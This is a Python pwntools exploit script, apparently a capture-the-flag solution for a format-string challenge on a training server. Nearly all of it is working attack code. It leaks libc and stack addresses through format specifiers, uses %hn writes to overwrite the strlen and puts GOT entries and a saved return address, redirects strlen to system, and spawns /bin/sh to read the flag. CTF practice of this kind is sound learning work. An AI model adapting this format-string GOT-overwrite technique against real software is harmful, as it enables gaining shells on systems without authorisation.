#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "pwn-another-format-string-9f0569c2bf22.training.bksec.vn"
exe = context.binary = ELF('./fmt_2', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
ld = ELF('/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x00000000004012C1
            b* 0x000000000040129C
            b* _dl_call_fini
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl=True, sni=HOST)
else:
    p = exe.process()


# VARIABLE
main = exe.sym.main
ret = 0x401301

# PAYLOAD
payload = f'%{main & 0xffff}c%8$hn'.encode()
payload += b'|%9$s'
payload = payload.ljust(0x10, b'\0')
payload += p64(exe.got.strlen)
payload += p64(exe.got.puts)
p.sendlineafter(b'us?: ', payload)

p.recvuntil(b'|')
libc_leak = u64(p.recv(6) + b'\0'*2)
log.info("puts leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym.puts
log.info("Libc base: " + hex(libc.address))
# pop_rdi = 0x000000000010f78b + libc.address
# ret = pop_rdi + 1
# bin_sh = next(libc.search(b'/bin/sh'))
# system = libc.sym.system

payload = b'%12$p|'
p.recvuntil(b'said: ')
p.sendlineafter(b'us?: ', payload)
p.recvuntil(b'said: ')
stack_leak = int(p.recvuntil(b'|', drop=True), 16)
log.info("stack leak: " + hex(stack_leak))
system = 0x401070

payload = f'%{ret & 0xffff}c%8$hn'.encode()
payload = payload.ljust(0x10, b'\0')
payload += p64(stack_leak - 0x78)
p.sendlineafter(b'us?: ', payload)

payload = f'%{main & 0xffff}c%8$hn'.encode()
payload = payload.ljust(0x10, b'\0')
payload += p64(stack_leak - 0x70)
p.sendlineafter(b'us?: ', payload)

payload = f'%{main >> 16 & 0xffff}c%8$hn'.encode()
payload = payload.ljust(0x10, b'\0')
payload += p64(stack_leak - 0x70 + 2)
p.sendlineafter(b'us?: ', payload)

payload = f'%{0xffff + 1}c%8$hn'.encode()
payload = payload.ljust(0x10, b'\0')
payload += p64(stack_leak - 0x70 + 4)
p.sendlineafter(b'us?: ', payload)

payload = f'%{0xffff + 1}c%8$hn'.encode()
payload = payload.ljust(0x10, b'\0')
payload += p64(stack_leak - 0x70 + 6)
p.sendlineafter(b'us?: ', payload)

payload = f'%{system & 0xffff}c%8$hn'.encode()
payload = payload.ljust(0x10, b'\0')
payload += p64(exe.got.strlen)
p.sendlineafter(b'us?: ', payload)

p.sendlineafter(b'us?: ', b'/bin/sh\0')

p.sendline(b'cat flag.txt')

p.interactive()